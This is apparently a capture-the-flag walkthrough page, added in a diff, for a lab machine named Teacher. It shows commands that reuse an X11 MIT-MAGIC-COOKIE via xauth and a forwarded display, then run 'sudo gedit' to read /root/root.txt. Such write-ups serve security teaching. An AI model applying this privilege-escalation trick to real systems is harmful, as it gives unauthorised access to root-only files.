@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5.2 xauth (Second flag)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>5.2 xauth (Second flag)</h1><br/><p></p><p>1. Run the following commands on your Kali Machine.</p><p>   <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">ssh</span> -X mrteacher@192.168.12.65<br /><br /><br /></pre></div> </p><p>   </p><p>   <div class="codebox"><pre>mrteacher@Teacher<span style="color:#a52a2a;font-weight:700">:</span>~$ xauth list <span style="color:#6a5acd;font-weight:400">$DISPLAY</span></pre></div></p><p>   <span style="color:#ffa500;">Output:</span></p><p>   <img src="images/1033-1.png" alt="images/1033-1.png" /></p><p></p><p>   You&#39;ll get a cookie.</p><p> </p><p>   <div class="codebox"><pre>mrteacher@Teacher<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">echo</span> <span style="color:#6a5acd;font-weight:400">$DISPLAY</span></pre></div> </p><p>   <span style="color:#ffa500;">Output:</span>   </p><p>   <img src="images/1033-2.png" alt="images/1033-2.png" /></p><p>   </p><p>   <div class="codebox"><pre>mrteacher@Teacher<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">sudo</span> xauth add Teacher<span style="color:#a52a2a;font-weight:700">/</span>unix<span style="color:#a52a2a;font-weight:700">:</span>10  MIT-MAGIC-COOKIE-1 89bd3adc2a4b597cb7adfd584d8bcc8f<br /></pre></div></p><p>   <div class="codebox"><pre>mrteacher@Teacher<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">export</span> <span style="color:#6a5acd;font-weight:400">DISPLAY</span>=localhost<span style="color:#a52a2a;font-weight:700">:</span>10.0<br /></pre></div></p><p></p><p>2. Open “gedit” with sudo.   </p><p>   <div class="codebox"><pre>mrteacher@Teacher<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">sudo</span> gedit<br /></pre></div></p><p></p><p>3. Open “/root/root.txt” on “gedit”. You&#39;ll see the flag.</p><p></p><p>   <span style="color:#ffa500;">Output:</span>    </p><p>   <img src="images/1033-3.png" alt="images/1033-3.png" /></p><p></p><p>    </p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
+</body>
+</html>
